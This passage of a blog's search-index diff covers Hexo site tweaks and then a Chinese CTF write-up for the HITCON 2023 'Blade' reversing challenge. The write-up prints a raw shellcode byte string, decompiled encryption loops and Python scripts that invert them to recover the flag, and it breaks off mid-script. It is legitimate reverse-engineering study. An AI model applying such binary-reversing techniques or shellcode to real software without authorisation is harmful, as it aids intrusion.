+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/live2djs.jpg"
+                     
+                ></p>
+<p>我当年弄网页Live2D就是想要放上血小板那个模型，但当年怎么都找不到，而且技术也不过关。现在看来，这个Live2D接口要自己搭后端，否则就只能用别人的老接口，用现有的模型。最近期末了比较忙没时间整了，先挖个坑以后来填。</p>
+<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>代码块的默认字体太丑了，换成Consolas了，也是靠修改主题文件中的highlight.styl配置，把font-family参数全部修改。</p>
+<p>Mozilla还有个页面可以在线调试字体配置：<a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-family" >https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-family <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>和我想的不一样，网页的部署是Hexo自动完成的，生成的网页和源码完全是两回事，所以还需要新开一个仓库来保存源码。但是感觉好麻烦，每次都要执行好几次命令，而且我node_module放在项目文件夹里的，git扫描要挺久的。后续想尝试下用Action，push源码后自动运行Hexo生成网页。</p>
+<h3 id="Github-Action-自动布署-Hexo"><a href="#Github-Action-自动布署-Hexo" class="headerlink" title="Github Action 自动布署 Hexo"></a>Github Action 自动布署 Hexo</h3><p>参考了这篇文章：<a class="link"   href="https://zhuanlan.zhihu.com/p/170563000" >https://zhuanlan.zhihu.com/p/170563000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>简单说一下结构。我上传的源码中包含NodeModule和Hexo文件，所以在Action中直接用命令行调用即可。Hexo依赖Git来推送布署网站，所以要生成一对密钥给Git用。当我push源码到仓库时，workflow被触发，在云端Action上clone我的网站源码并执行Hexo，这样就能更新我的网站了。</p>
+<p>还有个坑没搞明白，Action上运行Hexo布署网站后，仓库的git log只剩两条了，而我在本地布署并不会这样，<del>猜测和clone --depth&#x3D;1有关</del>(没有关系)。</p>
+<h3 id="Aplayer"><a href="#Aplayer" class="headerlink" title="Aplayer"></a>Aplayer</h3><p>网页左下角的音乐播放器是Aplayer实现的，参考了这篇文章<a class="link"   href="https://blog.csdn.net/weixin_58068682/article/details/116612364" >https://blog.csdn.net/weixin_58068682&#x2F;article&#x2F;details&#x2F;116612364 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这篇文章中使用的Hexo主题是Butterfly，和我的并不一样。不过我的主题也支持pjax，应该是能实现全局音乐播放的，最后折腾了一番才把我的整好。</p>
+<p>遇到一个坑：Aplayer的&lt;div&gt;代码一开始是放footer的，但一切换页面左下角播放器就消失了，音乐倒是还在放。然后思考了一下决定把代码放body里，于是修改layout.ejs，成功。</p>
+<h3 id="Jpegoptim"><a href="#Jpegoptim" class="headerlink" title="Jpegoptim"></a>Jpegoptim</h3><p>因为博客采用Github Page，所以访问速度有够慢的，live2D经常加载不出来(倒是和Page无关)。考虑到后期上的图可能比较多，不可能每次都手动压缩，我设置了jpg压缩程序，使用的是Jpegoptim，配合find就能实现批量操作。另外，每次加图片都要跑到主题module文件夹里去，因为生成网页源码就从那个地方加载，不知道怎么调，干脆就写了个shell命令从外面文件夹复制图片进去，这样加图片会比较方便。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">find ./public/images/post_imgs/ -not -iname &quot;*_raw.jpg&quot; -not -iname &quot;*_raw.jpeg&quot; -iname &quot;*.jpg&quot; -o -iname &quot;*.jpeg&quot; | xargs jpegoptim -m 80</span><br></pre></td></tr></table></figure></div>
+
+<p>上述代码为设置jpg质量为80，jpegoptim会默认跳过一些不需要优化压缩的图片。另外这个优化并不是对原图片进行修改，而是对hexo g之后生成的public文件夹中图片进行修改，原图能得到比较妥善的保管。文件名最后带有_raw的jpg&#x2F;jpeg图片不会被压缩。</p>
+<p>后续待更新</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hitcon 2023 Blade WP</title>
+    <url>/2023/09/10/hitcon-2023-blade-wp/</url>
+    <content><![CDATA[<p>不太会，只做了这一道</p>
+<h3 id="表面行为分析"><a href="#表面行为分析" class="headerlink" title="表面行为分析"></a>表面行为分析</h3><p>首先运行程序，会进入一个交互界面，然后提示可以进入 server 模式，并且 <code>run</code> 之后打印出来一串 opcode</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_run.jpg"
+                     
+                ></p>
+<p>nc 连 server，server 提示连接成功，<code>help</code> 查看指令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_server_help.jpg"
+                     
+                ></p>
+<p>随后尝试运行这些指令，server 这边直接卡住了，但是 nc 这边出现了乱码</p>
+<p>如图是运行 pwd 出现的乱码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_pwd.jpg"
+                     
+                ></p>
+<p>由于看不出来是什么，所以上 pwntools 提一下数据得到</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;T]1\xf6\x81\xc6\x00\x10\x00\x00H)\xf4T_jOX\x0f\x05PH\x92H\x83\xc2\x08S_T^j\x01X\x0f\x05U\\A\xff\xe7&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>有点抽象，难道是 <code>pwd</code> 执行结果加密后的数据表现吗？那么 flag 有可能和这个是同一套加密，那么也许可以先找到这套加密代码，再看看程序中有无藏匿的 flag 加密后数据，从而得到原 flag。但是这个猜想不一定对，我又尝试执行了 <code>ls</code> ，得到的数据和上面的差不多，而且比较短，感觉文件名加密后不可能才这么点长。于是我将其复制到 IDA 里 c 一下，发现这玩意儿是 opcode，疑似是实现其列出的操作的代码，但是这样打印出来不知道干嘛的。</p>
+<p>到这里程序表象已经看不出来什么了，接下来是逆向环节</p>
+<h3 id="程序逆向分析"><a href="#程序逆向分析" class="headerlink" title="程序逆向分析"></a>程序逆向分析</h3><p>IDA 打开能直接找到 <code>main</code> 函数 <code>seccomp_shell::main::hef7e76ec97275895()</code></p>
+<p><code>main</code> 函数中直接能找到关键函数 <code>seccomp_shell::cli::prompt::h56d4b6fe2f13f522(&amp;v5)</code></p>
+<p>由函数名可以推断，这个函数负责处理 cli 界面与指令，有可能是通过类似 <code>switch</code> 的方式来处理指令</p>
+<p>根据经验，这种处理 cli 的函数前面可能会根据终端的环境变量来设置或打印一些初始化内容，所以前面的代码大概率没用，往后翻看看有无 <code>switch</code></p>
+<p>事实证明也确实有：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_shell.jpg"
+                     
+                ></p>
+<p>上图这种 <code>switch</code> 字符串的比较方式不知道是 Rust 编译器干的还是出题人故意这样写的，总之我看着值有点像 ascii 范围就 R 了一下，结果确实是字符。应该是根据用户输入进入相应的函数，那么进 <code>seccomp_shell::shell::prompt::h76cecfe7bd3bdf50(v33)</code> 看看吧</p>
+<p>然后就发现了刚刚打印出来的字符串，看来 server 之后进入的交互就是这个函数负责的：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_fun_shell_p.jpg"
+                     
+                ></p>
+<p>然后继续往下看，发现了爆点</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_shell_flag.jpg"
+                     
+                ></p>
+<p>上图中出现了 <code>flag</code> 命令，我随即启动程序测试</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_input_flag.jpg"
+                     
+                ></p>
+<p>如图直接输 <code>flag</code> 会提示 Incorrect ，随后我在后面加参数运行也不会有报错，猜测就是把 <code>flag</code> 后面的参数拿去验证了。先进 <code>seccomp_shell::shell::verify::h898bf5fa26dafbab(v154, v175[3], v175[5])</code> 函数看看</p>
+<p>verify有点长就不截图了，挑几个部分说一下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest, &amp;unk_55DF6DF58920, <span class="number">0x200</span>uLL);</span><br><span class="line"> v52 = <span class="number">64LL</span>;</span><br><span class="line"> v53 = &amp;dest[<span class="number">1</span>];</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line"> &#123;</span><br><span class="line">   v54 = *(v53 - <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> ( v54 &gt; <span class="number">0x3F</span> )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">   v55 = tmp_addr[v52 - <span class="number">1</span>];</span><br><span class="line">   tmp_addr[v52 - <span class="number">1</span>] = tmp_addr[v54];</span><br><span class="line">   tmp_addr[v54] = v55;</span><br><span class="line">   v56 = *v53;</span><br><span class="line">   <span class="keyword">if</span> ( *v53 &gt; <span class="number">0x3F</span> )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">   v57 = tmp_addr[v52 - <span class="number">2</span>];</span><br><span class="line">   tmp_addr[v52 - <span class="number">2</span>] = tmp_addr[v56];</span><br><span class="line">   tmp_addr[v56] = v57;</span><br><span class="line">   v53 += <span class="number">2</span>;</span><br><span class="line">   v52 -= <span class="number">2LL</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">while</span> ( v52 );</span><br></pre></td></tr></table></figure></div>
+
+<p><code>tmp_addr</code> 是用户输入，长度为 64。这整个循环是在按照 <code>dest</code> 中的值来将 <code>tmp_addr</code> 的顺序打乱，而这样的循环一共有 5 个，除了每次复制到 <code>dest</code> 中的值不同以外，代码基本相同。并且复制到 <code>dest</code> 的值是常量，而代码的行为也与用户输入值没有任何关系。也就是说，可以将这 5 次打乱看作一次，我们只需要输入一串已知顺序的 64 字节字符串，然后动调得到输出的字符串，就能得到 64 位对应表，在还原 flag 时直接根据表就能还原。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v58 = <span class="number">0LL</span>;                                  <span class="comment">// exchange end</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v59 = tmp_addr[v58] + <span class="number">1</span>;</span><br><span class="line">      LOWORD(v51) = <span class="number">1</span>;</span><br><span class="line">      LOWORD(v52) = <span class="number">257</span>;</span><br><span class="line">      v60 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v62 = v52;</span><br><span class="line">        LOWORD(v52) = v52 / v59;</span><br><span class="line">        v61 = v62 % v59;</span><br><span class="line">        v63 = v51;</span><br><span class="line">        v51 = v60 - v51 * v52;</span><br><span class="line">        LODWORD(v52) = v59;</span><br><span class="line">        v59 = (v62 % v59);</span><br><span class="line">        v60 = v63;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v61 );</span><br><span class="line">      v64 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v63 &gt; <span class="number">0</span> )</span><br><span class="line">        v64 = v63;</span><br><span class="line">      tmp_addr[v58] = ((v64 + (v63 &gt;&gt; <span class="number">15</span>) - v63) / <span class="number">0x101</span>u + v63 + (v63 &gt;&gt; <span class="number">15</span>) + <span class="number">113</span>) ^ <span class="number">0x89</span>;</span><br><span class="line">      v52 = v58 + <span class="number">1</span>;</span><br><span class="line">      v58 = v52;                                <span class="comment">// v58++</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v52 != <span class="number">64</span> );</span><br></pre></td></tr></table></figure></div>
+
+<p>打乱后是如上的加密，静态分析或动调都可以看出这个加密是以字节为单位的，并且这个加密的运算数似乎也与 flag 的其他位置值没有任何关系。那么有没有可能，我们可以得到一份加密前后的字节对应表，按照表就能将加密后的字节翻译为加密前的字节。</p>
+<p>生成 0~255 的 hex 序列，然后就能粘进IDA里提取加密后的值：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytearray</span>(<span class="built_in">range</span>(i, i+<span class="number">64</span>)).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>
+
+<p>本来以为就这点，但是拉到后面一看还有个 <code>while ( v8 != 256 );</code> ，而作用范围是刚才的打乱和加密，也就是说这个过程会循环 256 次，问题不大。</p>
+<p>得到的字节对应表与还原脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 动调得到的表</span></span><br><span class="line">s0_255 = [<span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x4E</span>, <span class="number">0xBB</span>, <span class="number">0x51</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0xB0</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0x8E</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0x60</span>, <span class="number">0xEB</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0xDE</span>, <span class="number">0x42</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0xA6</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x2A</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0x17</span>, <span class="number">0x9D</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>, <span class="number">0x69</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x61</span>, <span class="number">0xED</span>, <span class="number">0xAD</span>, <span class="number">0xE0</span>, <span class="number">0xDA</span>, <span class="number">0x27</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0xDC</span>, <span class="number">0x5E</span>, <span class="number">0xE7</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x03</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0xE1</span>, <span class="number">0xB3</span>, <span class="number">0xEC</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x79</span>, <span class="number">0xFD</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x80</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x39</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x1E</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x2E</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0xC4</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>,</span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x88</span>, <span class="number">0xC5</span>, <span class="number">0x7F</span>, <span class="number">0x77</span>, <span class="number">0x11</span>, <span class="number">0xCF</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0x3F</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>, <span class="number">0xE9</span>, <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0xB4</span>, <span class="number">0x96</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0x53</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0xD1</span>, <span class="number">0x33</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x7A</span>, <span class="number">0x2C</span>, <span class="number">0x9B</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0xF7</span>, <span class="number">0x20</span>, <span class="number">0xF2</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xD0</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x54</span>, <span class="number">0x1A</span>, <span class="number">0x01</span>, <span class="number">0xA1</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x85</span>, <span class="number">0x07</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x19</span>, <span class="number">0xF3</span>, <span class="number">0x36</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x98</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x45</span>, <span class="number">0x4A</span>, <span class="number">0x9A</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0xCC</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0xC9</span>, <span class="number">0x0E</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0xBF</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x90</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x3D</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0x91</span>, <span class="number">0x05</span>, <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x08</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x56</span>, <span class="number">0xCE</span>, <span class="number">0x82</span>, <span class="number">0x38</span>, <span class="number">0x95</span>, <span class="number">0x78</span>, <span class="number">0xF8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成对应字典</span></span><br><span class="line">crypto_table = <span class="built_in">dict</span>(<span class="built_in">zip</span>(s0_255,<span class="built_in">range</span>(<span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向查表得到原数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">list</span>, table: <span class="built_in">dict</span></span>):</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp.append(table[i])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure></div>
+
+<p>得到顺序表与还原的脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get order table</span></span><br><span class="line">source = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">replaced = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m&#x27;</span></span><br><span class="line">revsere_table = [] <span class="comment">#index是source在replace中的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> source:</span><br><span class="line">    revsere_table.append(replaced.find(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原顺序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_order</span>(<span class="params">data:<span class="built_in">list</span>, table: <span class="built_in">list</span></span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        tmp.append(data[table[i]])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure></div>
+
+<p>256 次就写个 for 循环就行了</p>
+<h3 id="程序如何比较"><a href="#程序如何比较" class="headerlink" title="程序如何比较"></a>程序如何比较</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_verify_1.jpg"
+                     
+                ></p>
+<p>如图是 256 次循环后的开头代码，这次 <code>memcpy</code> 加载了一块 255 字节的数据到堆中，但不是 <code>dest</code>。经过查看，这个数据又是 opcode</p>
+<p>经过调试发现 <code>dest</code> 加载了 64 字节的数据，那么这个数据很有可能是比较数据，直接拿到脚本里去跑，解出来却是乱码。一开始以为脚本写错了，但拿个明文加密的提取的数据去跑，确实是能跑出明文的，说明比对部分还有细节。</p>
+<p>在上图中，opcode 的某些部分被修改了，并且与加密后的输入有关，随后我又偶然发现 <code>if</code> 中对索引 <code>[223, 224, 225, 226]</code> 赋的值和 <code>dest</code> 开头的 4 字节一致，但仍然没看出来有什么比较。</p>
+<p>继续向后看，发现会读取 TcpStream io 之类的，不然会卡住等待输入，在 nc 那边输点东西就可以继续跑</p>
+<p>然后找到了这个函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_verify_2.jpg"
+                     
+                ></p>
+<p>我一开始以为这个就是比较函数，但是仔细看发现根本没有比较的操作，而是又是在对 opcode 进行修改操作，并且将 opcode 数据发送到 nc 端，与之前那个 <code>if</code> 里的代码行为一致，应该是编译优化导致的。</p>
+<p>看了半天确定这个程序里确实没有任何比较操作，我将目光转向那个 opcode。经过辨认发现 opcode 被修改的值是如下两个地方：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000564D3A41F1FD                 mov     eax, 1015CB52h # 加密的用户输入</span><br><span class="line">.text:0000564D3A41F202                 add     eax, r12d</span><br><span class="line">.text:0000564D3A41F205                 xor     eax, r13d</span><br><span class="line">.text:0000564D3A41F208                 ror     eax, 0Bh</span><br><span class="line">.text:0000564D3A41F20B                 not     eax</span><br><span class="line">.text:0000564D3A41F20D                 xor     eax, r14d</span><br><span class="line">.text:0000564D3A41F210                 cmp     eax, 526851A7h # dest</span><br><span class="line">.text:0000564D3A41F215                 jnz     short loc_564D3A41F21C</span><br></pre></td></tr></table></figure></div>
+
+<p>程序中的行为是取加密后的用户输入与 <code>dest</code> 中的值写入 opcode 这两处，而这个 opcode 也很明显能看出来是在验证。但是这其中 <code>r12 r13 r14</code> 寄存器的值都是未知的，我的猜测是 opcode 前面执行的代码会影响这三个寄存器，使其在运行到此处时为定值。所以我运行了该 opcode，得到三个寄存器的值：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r12 = 0x0000000464C457F</span><br><span class="line">r13 = 0x0000000746F6F72</span><br><span class="line">r14 = 0x000000031F3831F</span><br></pre></td></tr></table></figure></div>
+
+<p>逆该过程脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由于需要模拟汇编中的位运算，所以需要使用 numpy 库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_cmp</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    <span class="comment">#print(hex(x))</span></span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br></pre></td></tr></table></figure></div>
+
+<p>总的来看，整个程序其实根本没有验证 flag 的正确性，也没有执行这些 opcode，这些 opcode 只是被作为数据发送到了 nc 端</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">list</span>, table: <span class="built_in">dict</span></span>):</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp.append(table[i])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_order</span>(<span class="params">data:<span class="built_in">list</span>, table: <span class="built_in">list</span></span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        tmp.append(data[table[i]])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def de_cmp(x):</span></span><br><span class="line"><span class="string">    r12 = 0x0000000464C457F</span></span><br><span class="line"><span class="string">    r13 = 0x0000000746F6F72</span></span><br><span class="line"><span class="string">    r14 = 0x000000031F3831F</span></span><br><span class="line"><span class="string">    x ^= r14</span></span><br><span class="line"><span class="string">    x = ~x</span></span><br><span class="line"><span class="string">    x = (x &lt;&lt; 11) | (x &gt;&gt; (32 - 11))</span></span><br><span class="line"><span class="string">    x ^= r13</span></span><br><span class="line"><span class="string">    x -= r12</span></span><br><span class="line"><span class="string">    print(hex(x))</span></span><br><span class="line"><span class="string">    return [x &amp; 0xff, (x &amp; 0xff00) &gt;&gt; 8, (x &amp; 0xff0000) &gt;&gt; 16, (x &amp; 0xff000000) &gt;&gt; 24]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_cmp</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - 